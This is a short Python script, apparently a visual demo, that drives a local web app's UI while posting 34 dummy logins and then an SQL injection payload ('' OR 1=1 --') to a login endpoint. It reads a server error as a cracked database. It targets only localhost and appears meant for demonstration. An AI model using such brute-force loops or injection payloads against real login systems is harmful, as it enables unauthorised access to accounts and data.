import requests
import time

# 34 Fast attempts + 1 Final Kill Shot
ATTACK_SAMPLES = [(f"user_{i}", f"pass_{i*99}") for i in range(1, 35)]
ATTACK_SAMPLES.append(("admin'--", "' OR 1=1 --"))

def run_brutal_attack():
    URL = "http://127.0.0.1:5000"
    print("INITIATING AUTONOMOUS BREACH SIMULATION...")
    
    try:
        requests.post(f"{URL}/api/reset")
        requests.post(f"{URL}/api/fuzz-start")
        
        for user, pw in ATTACK_SAMPLES:
            # 1. Update UI (Ghost Typing)
            requests.post(f"{URL}/api/update-payload", json={"user": user, "password": pw, "clicking": False})
            time.sleep(0.1) 
            
            # 2. Update UI (Visually Click Button)
            requests.post(f"{URL}/api/update-payload", json={"user": user, "password": pw, "clicking": True})
            
            # 3. Send Login Request
            res = requests.post(f"{URL}/api/login-attempt", json={"username": user, "password": pw})
            
            if res.status_code == 500:
                print("BOOM. DATABASE CRACKED.")
                break
                
            time.sleep(0.1) 
    except Exception as e:
        print(f"ERROR: Is app.py running? {e}")

if __name__ == "__main__":
    run_brutal_attack()
